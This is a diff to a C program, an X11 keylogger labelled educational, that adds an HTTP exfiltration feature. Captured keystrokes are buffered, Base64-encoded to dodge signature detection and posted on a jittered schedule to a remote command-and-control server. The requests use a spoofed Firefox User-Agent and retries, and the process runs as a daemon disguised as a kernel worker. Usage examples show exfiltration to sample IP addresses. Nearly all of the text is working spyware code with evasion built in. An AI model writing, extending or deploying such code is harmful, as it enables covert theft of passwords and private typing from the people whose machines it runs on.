@@ -30,9 +30,42 @@
 #include <sys/prctl.h>
 #include <getopt.h>
 
+// Includes para exfiltración de red
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <errno.h>
+
 #define LOG_FILE "keylog.txt"
 #define MAX_WINDOW_NAME 256
 #define DAEMON_PROCESS_NAME "kworker/0:0"  // Nombre que simula un proceso del kernel
+
+// Constantes de exfiltración
+#define EXFIL_BUFFER_SIZE 8192
+#define EXFIL_INTERVAL_MIN 45   // Segundos mínimo entre envíos
+#define EXFIL_INTERVAL_MAX 75   // Segundos máximo (jitter para evasión)
+#define EXFIL_MAX_RETRIES 3
+#define EXFIL_DEFAULT_PORT "8080"
+#define EXFIL_DEFAULT_PATH "/upload"
+// User-Agent que simula Firefox en Linux para evadir detección
+#define EXFIL_USER_AGENT "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+/**
+ * Estructura para el estado de exfiltración HTTP.
+ * Permite enviar datos capturados a un servidor C2 remoto.
+ */
+typedef struct {
+    int enabled;                          // Flag para activar exfiltración
+    char server[256];                     // IP o hostname del servidor C2
+    char port[16];                        // Puerto del servidor
+    char path[256];                       // Path del endpoint (ej: /upload)
+    pthread_t thread;                     // Thread de exfiltración
+    pthread_mutex_t buffer_mutex;         // Mutex para sincronización del buffer
+    char buffer[EXFIL_BUFFER_SIZE];       // Buffer de datos a exfiltrar
+    size_t buffer_len;                    // Longitud actual del buffer
+    volatile int thread_running;          // Flag para control del thread
+} ExfilState;
 
 // Estructura para encapsular el estado del keylogger
 typedef struct {
@@ -46,6 +79,7 @@ typedef struct {
     char log_filename[256];
     char last_window[MAX_WINDOW_NAME];
     char display_env[64];  // Guardar DISPLAY para uso después de daemonizar
+    ExfilState exfil;      // Estado de exfiltración
 } KeyloggerState;
 
 // Estado global del keylogger
@@ -59,7 +93,17 @@ static KeyloggerState g_state = {
     .quiet_mode = 0,
     .log_filename = LOG_FILE,
     .last_window = {0},
-    .display_env = {0}
+    .display_env = {0},
+    .exfil = {
+        .enabled = 0,
+        .server = {0},
+        .port = EXFIL_DEFAULT_PORT,
+        .path = EXFIL_DEFAULT_PATH,
+        .thread = 0,
+        .buffer = {0},
+        .buffer_len = 0,
+        .thread_running = 0
+    }
 };
 
 // Manejador de señales para limpieza
@@ -179,20 +223,390 @@ void get_timestamp(char *buffer, size_t size) {
     strftime(buffer, size, "%Y-%m-%d %H:%M:%S", t);
 }
 
+// ============================================================================
+// FUNCIONES DE EXFILTRACIÓN
+// ============================================================================
+
+// Tabla de caracteres Base64
+static const char base64_table[] = 
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+/**
+ * Codifica datos en Base64 para evadir detección por firmas de texto plano.
+ * 
+ * @param input Datos a codificar
+ * @param input_len Longitud de los datos de entrada
+ * @param output Buffer de salida (debe tener al menos (input_len * 4/3) + 4 bytes)
+ * @param output_size Tamaño del buffer de salida
+ * @return Longitud de la cadena codificada, o -1 en error
+ */
+int exfil_base64_encode(const unsigned char *input, size_t input_len, 
+                        char *output, size_t output_size) {
+    size_t i, j;
+    size_t output_len = 4 * ((input_len + 2) / 3);
+    
+    if (output_size < output_len + 1) {
+        return -1;  // Buffer muy pequeño
+    }
+    
+    for (i = 0, j = 0; i < input_len;) {
+        uint32_t octet_a = i < input_len ? input[i++] : 0;
+        uint32_t octet_b = i < input_len ? input[i++] : 0;
+        uint32_t octet_c = i < input_len ? input[i++] : 0;
+        
+        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
+        
+        output[j++] = base64_table[(triple >> 18) & 0x3F];
+        output[j++] = base64_table[(triple >> 12) & 0x3F];
+        output[j++] = base64_table[(triple >> 6) & 0x3F];
+        output[j++] = base64_table[triple & 0x3F];
+    }
+    
+    // Padding con '='
+    size_t mod = input_len % 3;
+    if (mod > 0) {
+        output[output_len - 1] = '=';
+        if (mod == 1) {
+            output[output_len - 2] = '=';
+        }
+    }
+    
+    output[output_len] = '\0';
+    return (int)output_len;
+}
+
+/**
+ * Envía datos al servidor C2 mediante HTTP POST.
+ * Implementa técnicas de evasión: User-Agent spoofing y codificación Base64.
+ * 
+ * @param server Hostname o IP del servidor
+ * @param port Puerto del servidor
+ * @param path Path del endpoint (ej: /upload)
+ * @param data Datos a enviar (ya codificados en base64)
+ * @param data_len Longitud de los datos
+ * @return 0 en éxito, -1 en error
+ */
+int exfil_http_post(const char *server, const char *port, 
+                    const char *path, const char *data, size_t data_len) {
+    struct addrinfo hints, *result, *rp;
+    int sockfd = -1;
+    int ret;
+    char request[EXFIL_BUFFER_SIZE + 512];
+    char response[256];
+    
+    // Configurar hints para getaddrinfo
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;      // IPv4 o IPv6
+    hints.ai_socktype = SOCK_STREAM;  // TCP
+    
+    // Resolver hostname
+    ret = getaddrinfo(server, port, &hints, &result);
+    if (ret != 0) {
+        return -1;  // Error de resolución DNS
+    }
+    
+    // Intentar conectar a cada dirección
+    for (rp = result; rp != NULL; rp = rp->ai_next) {
+        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
+        if (sockfd == -1) {
+            continue;
+        }
+        
+        // Configurar timeout de conexión
+        struct timeval tv;
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+        
+        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) != -1) {
+            break;  // Conexión exitosa
+        }
+        
+        close(sockfd);
+        sockfd = -1;
+    }
+    
+    freeaddrinfo(result);
+    
+    if (sockfd == -1) {
+        return -1;  // No se pudo conectar
+    }
+    
+    // Construir request HTTP POST con User-Agent spoofing
+    int request_len = snprintf(request, sizeof(request),
+        "POST %s HTTP/1.1\r\n"
+        "Host: %s:%s\r\n"
+        "User-Agent: %s\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %zu\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+        "data=%.*s",
+        path, server, port, EXFIL_USER_AGENT, 
+        data_len + 5,  // +5 por "data="
+        (int)data_len, data);
+    
+    // Enviar request
+    ssize_t sent = send(sockfd, request, request_len, 0);
+    if (sent < 0) {
+        close(sockfd);
+        return -1;
+    }
+    
+    // Leer respuesta (para verificar éxito, opcional)
+    ssize_t received = recv(sockfd, response, sizeof(response) - 1, 0);
+    if (received > 0) {
+        response[received] = '\0';
+        // Verificar código de respuesta HTTP (200 OK, etc.)
+        // No es crítico si falla, los datos ya fueron enviados
+    }
+    
+    close(sockfd);
+    return 0;
+}
+
+/**
+ * Agrega datos al buffer de exfiltración de forma thread-safe.
+ * Si el buffer está lleno, los datos más antiguos se descartan.
+ * 
+ * @param data Datos a agregar
+ * @param len Longitud de los datos
+ */
+void exfil_add_to_buffer(const char *data, size_t len) {
+    if (!g_state.exfil.enabled || len == 0) {
+        return;
+    }
+    
+    pthread_mutex_lock(&g_state.exfil.buffer_mutex);
+    
+    // Verificar si hay espacio en el buffer
+    size_t space_left = EXFIL_BUFFER_SIZE - g_state.exfil.buffer_len - 1;
+    
+    if (len > space_left) {
+        // Buffer lleno, truncar los datos
+        len = space_left;
+    }
+    
+    if (len > 0) {
+        memcpy(g_state.exfil.buffer + g_state.exfil.buffer_len, data, len);
+        g_state.exfil.buffer_len += len;
+        g_state.exfil.buffer[g_state.exfil.buffer_len] = '\0';
+    }
+    
+    pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
+}
+
+/**
+ * Obtiene un intervalo aleatorio con jitter para evadir detección por patrones.
+ * Retorna un valor entre EXFIL_INTERVAL_MIN y EXFIL_INTERVAL_MAX.
+ * 
+ * @return Segundos a esperar antes del próximo envío
+ */
+int exfil_get_jitter_interval(void) {
+    // Inicializar semilla solo una vez
+    static int seeded = 0;
+    if (!seeded) {
+        srand((unsigned int)time(NULL) ^ (unsigned int)getpid());
+        seeded = 1;
+    }
+    
+    int range = EXFIL_INTERVAL_MAX - EXFIL_INTERVAL_MIN;
+    return EXFIL_INTERVAL_MIN + (rand() % (range + 1));
+}
+
+/**
+ * Thread principal de exfiltración.
+ * Ejecuta en background, enviando datos periódicamente con jitter.
+ * Implementa reintentos con backoff exponencial en caso de fallo.
+ * 
+ * @param arg No utilizado
+ * @return NULL
+ */
+void* exfil_thread_func(void *arg) {
+    (void)arg;
+    
+    char send_buffer[EXFIL_BUFFER_SIZE];
+    char base64_buffer[EXFIL_BUFFER_SIZE * 2];  // Base64 expande ~33%
+    size_t send_len;
+    int retries;
+    int backoff;
+    
+    while (g_state.running && g_state.exfil.thread_running) {
+        // Esperar con jitter
+        int wait_time = exfil_get_jitter_interval();
+        
+        // Dormir en intervalos pequeños para poder detectar señal de terminación
+        for (int i = 0; i < wait_time && g_state.running && g_state.exfil.thread_running; i++) {
+            sleep(1);
+        }
+        
+        if (!g_state.running || !g_state.exfil.thread_running) {
+            break;
+        }
+        
+        // Obtener datos del buffer
+        pthread_mutex_lock(&g_state.exfil.buffer_mutex);
+        
+        if (g_state.exfil.buffer_len == 0) {
+            pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
+            continue;  // Nada que enviar
+        }
+        
+        // Copiar y vaciar buffer
+        send_len = g_state.exfil.buffer_len;
+        memcpy(send_buffer, g_state.exfil.buffer, send_len);
+        send_buffer[send_len] = '\0';
+        g_state.exfil.buffer_len = 0;
+        g_state.exfil.buffer[0] = '\0';
+        
+        pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
+        
+        // Codificar en Base64 para evadir detección por firmas
+        int base64_len = exfil_base64_encode(
+            (unsigned char *)send_buffer, send_len,
+            base64_buffer, sizeof(base64_buffer)
+        );
+        
+        if (base64_len < 0) {
+            continue;  // Error de codificación, descartar
+        }
+        
+        // Intentar enviar con reintentos y backoff exponencial
+        retries = 0;
+        backoff = 1;
+        
+        while (retries < EXFIL_MAX_RETRIES) {
+            int result = exfil_http_post(
+                g_state.exfil.server,
+                g_state.exfil.port,
+                g_state.exfil.path,
+                base64_buffer,
+                (size_t)base64_len
+            );
+            
+            if (result == 0) {
+                // Éxito
+                break;
+            }
+            
+            // Fallo: esperar con backoff exponencial antes de reintentar
+            retries++;
+            if (retries < EXFIL_MAX_RETRIES) {
+                sleep(backoff);
+                backoff *= 2;  // Duplicar tiempo de espera
+            }
+        }
+    }
+    
+    return NULL;
+}
+
+/**
+ * Inicializa el subsistema de exfiltración.
+ * Crea el mutex y lanza el thread de exfiltración.
+ * 
+ * @return 0 en éxito, -1 en error
+ */
+int init_exfiltration(void) {
+    if (!g_state.exfil.enabled) {
+        return 0;  // Exfiltración deshabilitada, nada que hacer
+    }
+    
+    // Validar configuración
+    if (g_state.exfil.server[0] == '\0') {
+        return -1;  // Servidor no configurado
+    }
+    
+    // Inicializar mutex
+    if (pthread_mutex_init(&g_state.exfil.buffer_mutex, NULL) != 0) {
+        return -1;
+    }
+    
+    // Marcar thread como activo
+    g_state.exfil.thread_running = 1;
+    
+    // Crear thread de exfiltración
+    if (pthread_create(&g_state.exfil.thread, NULL, exfil_thread_func, NULL) != 0) {
+        pthread_mutex_destroy(&g_state.exfil.buffer_mutex);
+        g_state.exfil.thread_running = 0;
+        return -1;
+    }
+    
+    return 0;
+}
+
+/**
+ * Limpia los recursos del subsistema de exfiltración.
+ * Envía los datos pendientes antes de terminar.
+ */
+void cleanup_exfiltration(void) {
+    if (!g_state.exfil.enabled) {
+        return;
+    }
+    
+    // Señalar al thread que debe terminar
+    g_state.exfil.thread_running = 0;
+    
+    // Esperar a que el thread termine
+    if (g_state.exfil.thread != 0) {
+        pthread_join(g_state.exfil.thread, NULL);
+        g_state.exfil.thread = 0;
+    }
+    
+    // Intentar enviar datos pendientes una última vez
+    if (g_state.exfil.buffer_len > 0) {
+        char base64_buffer[EXFIL_BUFFER_SIZE * 2];
+        int base64_len = exfil_base64_encode(
+            (unsigned char *)g_state.exfil.buffer, 
+            g_state.exfil.buffer_len,
+            base64_buffer, sizeof(base64_buffer)
+        );
+        
+        if (base64_len > 0) {
+            exfil_http_post(
+                g_state.exfil.server,
+                g_state.exfil.port,
+                g_state.exfil.path,
+                base64_buffer,
+                (size_t)base64_len
+            );
+        }
+    }
+    
+    // Destruir mutex
+    pthread_mutex_destroy(&g_state.exfil.buffer_mutex);
+}
+
+// ============================================================================
+// FIN FUNCIONES DE EXFILTRACIÓN
+// ============================================================================
+
 // Registrar evento de tecla
 void log_key_event(const char *window_name, const char *key_str) {
     char timestamp[64];
+    char log_line[512];
+    
     get_timestamp(timestamp, sizeof(timestamp));
+    
+    // Formatear línea de log
+    int log_len = snprintf(log_line, sizeof(log_line), 
+                          "[%s] [%s] %s\n", timestamp, window_name, key_str);
     
     // Escribir en archivo
     if (g_state.logfile) {
-        fprintf(g_state.logfile, "[%s] [%s] %s\n", timestamp, window_name, key_str);
+        fprintf(g_state.logfile, "%s", log_line);
         fflush(g_state.logfile);
+    }
+    
+    // Agregar al buffer de exfiltración si está habilitado
+    if (g_state.exfil.enabled && log_len > 0) {
+        exfil_add_to_buffer(log_line, (size_t)log_len);
     }
     
     // Mostrar en consola solo si no está en modo silencioso/daemon
     if (!g_state.quiet_mode && !g_state.daemon_mode) {
-        printf("[%s] [%s] %s\n", timestamp, window_name, key_str);
+        printf("%s", log_line);
     }
 }
 
@@ -356,6 +770,9 @@ void cleanup_resources(void) {
         g_state.record_context = 0;
     }
     
+    // Limpiar exfiltración (envía datos pendientes antes de cerrar)
+    cleanup_exfiltration();
+    
     // Cerrar archivo de log
     if (g_state.logfile) {
         fprintf(g_state.logfile, "\n=== Sesión finalizada ===\n");
@@ -384,15 +801,22 @@ void print_usage(const char *prog_name) {
     printf("X11 Educational Keylogger\n");
     printf("USO EDUCATIVO SOLAMENTE\n\n");
     printf("Uso: %s [opciones]\n\n", prog_name);
-    printf("Opciones:\n");
-    printf("  -d, --daemon     Ejecutar en segundo plano (oculto)\n");
-    printf("  -q, --quiet      Modo silencioso (sin output a consola)\n");
-    printf("  -o, --output     Archivo de log (default: %s)\n", LOG_FILE);
-    printf("  -h, --help       Mostrar esta ayuda\n\n");
+    printf("Opciones generales:\n");
+    printf("  -d, --daemon       Ejecutar en segundo plano (oculto)\n");
+    printf("  -q, --quiet        Modo silencioso (sin output a consola)\n");
+    printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
+    printf("  -h, --help         Mostrar esta ayuda\n\n");
+    printf("Opciones de exfiltración (C2):\n");
+    printf("  -e, --exfil            Habilitar exfiltración HTTP\n");
+    printf("  -s, --server HOST      IP/hostname del servidor C2\n");
+    printf("  -P, --exfil-port PORT  Puerto del servidor (default: %s)\n", EXFIL_DEFAULT_PORT);
+    printf("      --exfil-path PATH  Path del endpoint (default: %s)\n\n", EXFIL_DEFAULT_PATH);
     printf("Ejemplos:\n");
-    printf("  %s                    # Modo normal, visible en consola\n", prog_name);
-    printf("  %s -d                 # Modo daemon, oculto en segundo plano\n", prog_name);
-    printf("  %s -d -o /tmp/k.log   # Daemon con log personalizado\n", prog_name);
+    printf("  %s                              # Modo normal\n", prog_name);
+    printf("  %s -d                           # Daemon oculto\n", prog_name);
+    printf("  %s -d -o /tmp/k.log             # Daemon con log\n", prog_name);
+    printf("  %s -d -e -s 192.168.1.100       # Daemon con exfiltración\n", prog_name);
+    printf("  %s -d -e -s 10.0.0.5 -P 443     # Exfiltración por puerto 443\n", prog_name);
 }
 
 // Función principal del keylogger
@@ -484,8 +908,28 @@ int start_keylogger(void) {
     fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
     get_timestamp(timestamp, sizeof(timestamp));
     fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
-    fprintf(g_state.logfile, "Modo: %s\n\n", g_state.daemon_mode ? "daemon" : "normal");
+    fprintf(g_state.logfile, "Modo: %s\n", g_state.daemon_mode ? "daemon" : "normal");
+    if (g_state.exfil.enabled) {
+        fprintf(g_state.logfile, "Exfiltración: %s:%s%s\n", 
+                g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
+    }
+    fprintf(g_state.logfile, "\n");
     fflush(g_state.logfile);
+    
+    // Inicializar exfiltración si está habilitada
+    if (g_state.exfil.enabled) {
+        if (init_exfiltration() < 0) {
+            if (!g_state.quiet_mode) {
+                fprintf(stderr, "[!] Error: No se pudo inicializar exfiltración.\n");
+            }
+            cleanup_resources();
+            return 1;
+        }
+        if (!g_state.quiet_mode) {
+            printf("[*] Exfiltración habilitada: %s:%s%s\n", 
+                   g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
+        }
+    }
     
     // Configurar manejador de señales
     signal(SIGINT, signal_handler);
@@ -556,18 +1000,24 @@ int start_keylogger(void) {
 
 int main(int argc, char *argv[]) {
     int opt;
+    int option_index = 0;
     
     // Opciones largas para getopt_long
     static struct option long_options[] = {
-        {"daemon",  no_argument,       0, 'd'},
-        {"quiet",   no_argument,       0, 'q'},
-        {"output",  required_argument, 0, 'o'},
-        {"help",    no_argument,       0, 'h'},
+        {"daemon",      no_argument,       0, 'd'},
+        {"quiet",       no_argument,       0, 'q'},
+        {"output",      required_argument, 0, 'o'},
+        {"help",        no_argument,       0, 'h'},
+        // Opciones de exfiltración
+        {"exfil",       no_argument,       0, 'e'},
+        {"server",      required_argument, 0, 's'},
+        {"exfil-port",  required_argument, 0, 'P'},
+        {"exfil-path",  required_argument, 0, 256},  // Solo opción larga
         {0, 0, 0, 0}
     };
     
     // Parsear argumentos de línea de comandos
-    while ((opt = getopt_long(argc, argv, "dqo:h", long_options, NULL)) != -1) {
+    while ((opt = getopt_long(argc, argv, "dqo:hes:P:", long_options, &option_index)) != -1) {
         switch (opt) {
             case 'd':
                 g_state.daemon_mode = 1;
@@ -582,10 +1032,33 @@ int main(int argc, char *argv[]) {
             case 'h':
                 print_usage(argv[0]);
                 return 0;
+            // Opciones de exfiltración
+            case 'e':
+                g_state.exfil.enabled = 1;
+                break;
+            case 's':
+                strncpy(g_state.exfil.server, optarg, sizeof(g_state.exfil.server) - 1);
+                g_state.exfil.server[sizeof(g_state.exfil.server) - 1] = '\0';
+                break;
+            case 'P':
+                strncpy(g_state.exfil.port, optarg, sizeof(g_state.exfil.port) - 1);
+                g_state.exfil.port[sizeof(g_state.exfil.port) - 1] = '\0';
+                break;
+            case 256:  // --exfil-path
+                strncpy(g_state.exfil.path, optarg, sizeof(g_state.exfil.path) - 1);
+                g_state.exfil.path[sizeof(g_state.exfil.path) - 1] = '\0';
+                break;
             default:
                 print_usage(argv[0]);
                 return 1;
         }
+    }
+    
+    // Validar opciones de exfiltración
+    if (g_state.exfil.enabled && g_state.exfil.server[0] == '\0') {
+        fprintf(stderr, "[!] Error: Exfiltración habilitada pero falta --server\n");
+        print_usage(argv[0]);
+        return 1;
     }
     
     return start_keylogger();
